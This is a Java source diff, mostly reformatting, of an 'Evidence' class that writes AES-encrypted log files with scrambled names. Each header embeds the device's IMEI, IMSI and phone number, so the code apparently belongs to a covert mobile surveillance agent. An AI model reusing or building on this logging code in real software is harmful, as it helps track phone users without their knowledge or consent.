@@ -37,8 +37,6 @@ public final class Evidence {
 	/** The EVIDENCE delimiter. */
 	public static int EVIDENCE_DELIMITER = 0xABADC0DE;
 
-
-
 	/** The Constant TAG. */
 	private static final String TAG = "Evidence";
 	/** The first space. */
@@ -108,14 +106,16 @@ public final class Evidence {
 	 */
 	public Evidence(final int typeEvidenceId, final byte[] aesKey) {
 		this();
-		if(Cfg.DEBUG) Check.requires(aesKey != null, "aesKey null");
+		if (Cfg.DEBUG)
+			Check.requires(aesKey != null, "aesKey null");
 		// agent = agent_;
 		this.typeEvidenceId = typeEvidenceId;
 		this.aesKey = aesKey;
 
 		encryption = new Encryption(aesKey);
 		// if(Cfg.DEBUG) Check.ensures(agent != null, "createLog: agent null");
-		if(Cfg.DEBUG) Check.ensures(encryption != null, "encryption null");
+		if (Cfg.DEBUG)
+			Check.ensures(encryption != null, "encryption null");
 	}
 
 	/**
@@ -142,7 +142,8 @@ public final class Evidence {
 			if (firstSpace) {
 				firstSpace = false;
 
-				if(Cfg.DEBUG) Check.log( TAG + " FATAL: not enough space. Free : " + free);
+				if (Cfg.DEBUG)
+					Check.log(TAG + " FATAL: not enough space. Free : " + free);
 			}
 			return false;
 		} else {
@@ -161,7 +162,7 @@ public final class Evidence {
 	 */
 	public synchronized boolean close() {
 		boolean ret = false;
-		if(fconn!=null && fconn.exists()){
+		if (fconn != null && fconn.exists()) {
 			fconn.dropExtension(EvidenceCollector.LOG_TMP);
 			ret = true;
 		}
@@ -199,11 +200,11 @@ public final class Evidence {
 	 *            the log type
 	 * @return true, if successful
 	 */
-	public synchronized boolean createEvidence(final byte[] additionalData,
-			final int evidenceType) {
+	public synchronized boolean createEvidence(final byte[] additionalData, final int evidenceType) {
 
 		this.typeEvidenceId = evidenceType;
-		if(Cfg.DEBUG) Check.requires(fconn == null, "createLog: not previously closed");
+		if (Cfg.DEBUG)
+			Check.requires(fconn == null, "createLog: not previously closed");
 		timestamp = new Date();
 
 		int additionalLen = 0;
@@ -214,12 +215,12 @@ public final class Evidence {
 
 		enoughSpace = enoughSpace();
 		if (!enoughSpace) {
-			if(Cfg.DEBUG) Check.log( TAG + " createEvidence, no space");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " createEvidence, no space");
 			return false;
 		}
 
-		final Name name = evidenceCollector.makeNewName(this,
-				EvidenceType.getMemo(evidenceType));
+		final Name name = evidenceCollector.makeNewName(this, EvidenceType.getMemo(evidenceType));
 
 		progressive = name.progressive;
 
@@ -227,44 +228,51 @@ public final class Evidence {
 		final boolean ret = Path.createDirectory(dir);
 
 		if (!ret) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: Dir not created: " + dir);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Error: Dir not created: " + dir);
 			return false;
 		}
 
 		fileName = dir + name.encName + EvidenceCollector.LOG_TMP;
-		if(Cfg.DEBUG) Check.asserts(fileName != null, "null fileName");
-		//if(Cfg.DEBUG) Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
-		//		"file not scrambled");
-		// if(Cfg.DEBUG) Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
+		if (Cfg.DEBUG)
+			Check.asserts(fileName != null, "null fileName");
+		// if(Cfg.DEBUG)
+		// Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
+		// "file not scrambled");
+		// if(Cfg.DEBUG) Check.asserts(!fileName.endsWith("MOB"),
+		// "file not scrambled");
 		try {
 			fconn = new AutoFile(fileName);
 
 			if (fconn.exists()) {
 				close();
-				if(Cfg.DEBUG) Check.log( TAG + " FATAL: It should not exist:" + fileName);
+				if (Cfg.DEBUG)
+					Check.log(TAG + " FATAL: It should not exist:" + fileName);
 				return false;
 			}
-			if(Cfg.DEBUG) Check.log( TAG + " Created " + evidenceType + " : "
-					+ name.fileName);
-			final byte[] plainBuffer = makeDescription(additionalData,
-					evidenceType);
-			if(Cfg.DEBUG) Check.asserts(plainBuffer.length >= 32 + additionalLen,
-					"Short plainBuffer");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Created " + evidenceType + " : " + name.fileName);
+			final byte[] plainBuffer = makeDescription(additionalData, evidenceType);
+			if (Cfg.DEBUG)
+				Check.asserts(plainBuffer.length >= 32 + additionalLen, "Short plainBuffer");
 
 			final byte[] encBuffer = encryption.encryptData(plainBuffer);
-			if(Cfg.DEBUG) Check.asserts(encBuffer.length == encryption
-					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
+			if (Cfg.DEBUG)
+				Check.asserts(encBuffer.length == encryption.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
 			// scriviamo la dimensione dell'header paddato
 			fconn.write(Utils.intToByteArray(plainBuffer.length));
 			// scrittura dell'header cifrato
 			fconn.append(encBuffer);
-			if(Cfg.DEBUG) Check.asserts(fconn.getSize() == encBuffer.length + 4,
-					"Wrong filesize");
-			// if(AutoConfig.DEBUG) Check.log( TAG + " additionalData.length: " +
+			if (Cfg.DEBUG)
+				Check.asserts(fconn.getSize() == encBuffer.length + 4, "Wrong filesize");
+			// if(AutoConfig.DEBUG) Check.log( TAG + " additionalData.length: "
+			// +
 			// plainBuffer.length);
-			// if(AutoConfig.DEBUG) Check.log( TAG + " encBuffer.length: " + encBuffer.length);
+			// if(AutoConfig.DEBUG) Check.log( TAG + " encBuffer.length: " +
+			// encBuffer.length);
 		} catch (final Exception ex) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: file: " + name.fileName + " ex:" + ex);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Error: file: " + name.fileName + " ex:" + ex);
 			return false;
 		}
 
@@ -281,8 +289,7 @@ public final class Evidence {
 	 *            the log type
 	 * @return the byte[]
 	 */
-	public byte[] makeDescription(final byte[] additionalData,
-			final int evidenceType) {
+	public byte[] makeDescription(final byte[] additionalData, final int evidenceType) {
 
 		if (timestamp == null) {
 			timestamp = new Date();
@@ -304,22 +311,16 @@ public final class Evidence {
 		evidenceDescription.additionalData = additionalLen;
 		evidenceDescription.deviceIdLen = WChar.getBytes(device.getImei()).length;
 		evidenceDescription.userIdLen = WChar.getBytes(device.getImsi()).length;
-		evidenceDescription.sourceIdLen = WChar.getBytes(device
-				.getPhoneNumber()).length;
+		evidenceDescription.sourceIdLen = WChar.getBytes(device.getPhoneNumber()).length;
 
 		final byte[] baseHeader = evidenceDescription.getBytes();
-		if(Cfg.DEBUG) Check.asserts(baseHeader.length == evidenceDescription.length,
-				"Wrong log len");
-		final int headerLen = baseHeader.length
-				+ evidenceDescription.additionalData
-				+ evidenceDescription.deviceIdLen
-				+ evidenceDescription.userIdLen
-				+ evidenceDescription.sourceIdLen;
-		final byte[] plainBuffer = new byte[encryption
-				.getNextMultiple(headerLen)];
+		if (Cfg.DEBUG)
+			Check.asserts(baseHeader.length == evidenceDescription.length, "Wrong log len");
+		final int headerLen = baseHeader.length + evidenceDescription.additionalData + evidenceDescription.deviceIdLen
+				+ evidenceDescription.userIdLen + evidenceDescription.sourceIdLen;
+		final byte[] plainBuffer = new byte[encryption.getNextMultiple(headerLen)];
 
-		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
-				plainBuffer.length);
+		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0, plainBuffer.length);
 		databuffer.write(baseHeader);
 		databuffer.write(WChar.getBytes(device.getImei()));
 		databuffer.write(WChar.getBytes(device.getImsi()));
@@ -331,8 +332,6 @@ public final class Evidence {
 
 		return plainBuffer;
 	}
-
-
 
 	/**
 	 * Write evidence.
@@ -356,17 +355,17 @@ public final class Evidence {
 	 *            the offset
 	 * @return true, if successful
 	 */
-	public synchronized boolean writeEvidence(final byte[] data,
-			final int offset) {
+	public synchronized boolean writeEvidence(final byte[] data, final int offset) {
 
-		if(!enoughSpace){
+		if (!enoughSpace) {
 			return false;
 		}
-		
+
 		encData = encryption.encryptData(data, offset);
 
 		if (fconn == null) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: fconn null");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Error: fconn null");
 			return false;
 		}
 
@@ -375,7 +374,8 @@ public final class Evidence {
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: Error writing file: " + e);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Error: Error writing file: " + e);
 			return false;
 		}
 
@@ -426,11 +426,14 @@ public final class Evidence {
 	public static void info(final String message) {
 		try {
 			// atomic info
-			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(
-					message, true));
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Info: " + message);
+
+			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(message, true));
 
 		} catch (final Exception ex) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex.toString());
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Error: " + ex.toString());
 		}
 	}
 
@@ -444,11 +447,11 @@ public final class Evidence {
 	 * @param content
 	 *            the content
 	 */
-	public void atomicWriteOnce(final byte[] additionalData,
-			final int logType, final byte[] content) {
+	public void atomicWriteOnce(final byte[] additionalData, final int logType, final byte[] content) {
 		if (createEvidence(additionalData, logType)) {
 			writeEvidence(content);
-			if(Cfg.DEBUG) Check.ensures(getEncData().length % 16 == 0, "wrong len");
+			if (Cfg.DEBUG)
+				Check.ensures(getEncData().length % 16 == 0, "wrong len");
 			close();
 		}
 	}
